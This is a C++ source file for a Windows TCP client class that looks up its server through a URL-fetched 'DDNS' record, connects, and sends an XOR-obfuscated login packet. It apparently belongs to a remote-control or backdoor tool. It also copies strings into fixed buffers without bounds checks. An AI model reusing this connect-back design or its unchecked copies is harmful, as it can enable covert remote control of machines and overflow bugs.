// MyTrans.cpp: implementation of the CMyClientTran class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "MyClientTran.h"
#include "MyMainFunc.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CMyClientTran::CMyClientTran()
{
	m_Socket = NULL;
	ZeroMemory(m_Addr, sizeof(m_Addr));
	m_Port = 0;
}

CMyClientTran::~CMyClientTran()
{
	Close();
}

DWORD CMyClientTran::GetIpLong(LPCTSTR pServerAddr)
{
	char m_RealIp[MAX_PATH] = {0};
	lstrcpy(m_RealIp, pServerAddr);
	DWORD dIp = inet_addr(m_RealIp);
	if(dIp == INADDR_NONE)
	{
		PHOSTENT hostinfo = gethostbyname(m_RealIp);
		if(hostinfo != NULL)
		{
			struct sockaddr_in dest = {0};
			CopyMemory(&(dest.sin_addr), hostinfo->h_addr_list[0], hostinfo->h_length);
			dIp = (ULONG) inet_addr(inet_ntoa(dest.sin_addr));
		}
	}
	return dIp;
}

BOOL CMyClientTran::GetRealServerInfo(char* m_DdnsUrl, char* pServerAddr, UINT* pServerPort)
{
	char m_Url[1024] = {0};
	wsprintf(m_Url, "http://%s", m_DdnsUrl);
	char m_FileName[MAX_PATH] = {0};
	GetTempPath(250, m_FileName);
	wsprintf(m_FileName + lstrlen(m_FileName), "%08x.txt", GetCurrentThreadId());
	if(!MyMainFunc::GetUrlFile(m_Url, m_FileName))
	{
		return FALSE;
	}

	HANDLE hFile = CreateFile(
			m_FileName,  
			GENERIC_READ,   
			FILE_SHARE_READ, 
			NULL,           
			OPEN_EXISTING,      
			FILE_ATTRIBUTE_NORMAL, 
			NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	DWORD nReadLen = 0;
	DWORD nFileLen = GetFileSize(hFile, NULL);
	char* pFileBuf = new char[nFileLen];
	ReadFile(hFile, pFileBuf, nFileLen, &nReadLen, NULL);
	CloseHandle(hFile);
	DeleteFile(m_FileName);

	//取掉末尾
	char* pDot = StrChr(pFileBuf , '\r');
	if(pDot != NULL)
	{
		*pDot = 0;
	}
	pDot = StrChr(pFileBuf , '\n');
	if(pDot != NULL)
	{
		*pDot = 0;
	}

	pDot = StrChr(pFileBuf , ':');
	if(pDot == NULL) 
	{
		StrCpy(pServerAddr, pFileBuf);
		*pServerPort = 80;
		delete [] pFileBuf;
		return TRUE;
	}

	*pDot = 0;
	lstrcpyA(pServerAddr, pFileBuf);
	*pServerPort = StrToIntA(pDot + 1);
	delete [] pFileBuf;
	return TRUE;
}

//发送数据
BOOL CMyClientTran::SendData(LPVOID data, DWORD len)
{
	char* p = (char*) data;
	DWORD i = 0;
	int k = (int) len;
	int ret = 0;
	
	if(m_Socket == NULL)
	{
		return FALSE;
	}

	while(i < len)
	{
		ret = send(m_Socket, p, k, 0);
		if(ret <= 0)
		{
			return FALSE;
		}

		i += ret;
		p += ret;
		k -= ret;
	}
	return TRUE;
}

//接收数据
BOOL CMyClientTran::RecvData(LPVOID data, DWORD len)
{
	char* p = (char*) data;
	DWORD i = 0;
	int k = (int) len;
	int ret = 0;

	if(m_Socket == NULL)
	{
		return FALSE;
	}

	while(i < len)
	{
		ret = recv(m_Socket, p, k, 0);
		if(ret <= 0)
		{
			return FALSE;
		}

		i += ret;
		p += ret;
		k -= ret;
	}
	return TRUE;
}

BOOL CMyClientTran::Create(DWORD nCmd, char* m_ServerAddr, UINT m_ServerPort, char* pUrl, UINT nPassWord)
{
	Close();

	StrCpy(m_Addr, m_ServerAddr);
	m_Port = m_ServerPort;

	//查看是否有ddns
	if(lstrlen(pUrl) != 0)
	{
		GetRealServerInfo(pUrl, m_Addr, &m_Port);
	}

	//连接到服务器
	m_Socket = GetConnectSocket(m_Addr, m_Port);
	if(m_Socket == NULL)
	{
		return FALSE;
	}
	
	//协商初始数据
	LOGININFO m_LoginInfo = {0};
	m_LoginInfo.m_Cmd = nCmd;
	m_LoginInfo.m_hWnd = (HWND) nPassWord;
	m_LoginInfo.m_UserId = PS_USER_ID;
	EncryptByte(&m_LoginInfo, sizeof(LOGININFO));
	return SendData(&m_LoginInfo, sizeof(LOGININFO));
}

void CMyClientTran::EncryptByte(LPVOID pData, DWORD nLen)
{
	BYTE* pTmpData = (BYTE*) pData;
	for(DWORD i = 0; i < nLen; i++)
	{
		pTmpData[i] = pTmpData[i] ^ PS_ENTRY_COMM_KEY;	
	}
}

void CMyClientTran::Close()
{
	if(m_Socket != NULL)
	{
		closesocket(m_Socket);
		m_Socket = NULL;
	}
	ZeroMemory(m_Addr, sizeof(m_Addr));
	m_Port = 0;
}

SOCKET CMyClientTran::GetConnectSocket(LPCTSTR pServerAddr, UINT nServerPort)
{
	struct sockaddr_in	m_ServerAddr = {0}; 
	int			m_AddrLen = sizeof(struct sockaddr_in);
	SOCKET		m_Socket = 0;

	char m_sServerIp[MAX_PATH] = {0};
	lstrcpy(m_sServerIp, pServerAddr);
	DWORD dIp = inet_addr(m_sServerIp);
	if(dIp == INADDR_NONE)
	{
		PHOSTENT hostinfo = gethostbyname(m_sServerIp);
		if(hostinfo == NULL)
		{
			return NULL;
		}
		struct sockaddr_in dest = {0};
		CopyMemory(&(dest.sin_addr), hostinfo->h_addr_list[0], hostinfo->h_length);
		lstrcpyA(m_sServerIp, inet_ntoa(dest.sin_addr));
	}

	//初始化连接信息
	m_ServerAddr.sin_addr.S_un.S_addr = inet_addr(m_sServerIp);
	m_ServerAddr.sin_port = htons(nServerPort); 
	m_ServerAddr.sin_family = AF_INET;

	//创建发送套接字
	m_Socket = socket(AF_INET, SOCK_STREAM, 0);
	if(m_Socket == INVALID_SOCKET)
	{
		return NULL;
	}
	
	//连接客户计算机
	if(connect(m_Socket, (sockaddr*)& m_ServerAddr, m_AddrLen) == SOCKET_ERROR) 
	{ 
		closesocket(m_Socket); 
		return NULL;
	}

	BOOL nodelayval = TRUE;
	if (setsockopt(m_Socket, IPPROTO_TCP, TCP_NODELAY, (const char *) &nodelayval, sizeof(BOOL)))
	{
		closesocket(m_Socket); 
		return NULL;
	}

	const int one = 1;
	if (setsockopt(m_Socket, SOL_SOCKET, SO_KEEPALIVE, (char *)&one, sizeof(one)))
    {
		closesocket(m_Socket); 
		return NULL;
    }

	//连接成功
	return m_Socket;
}

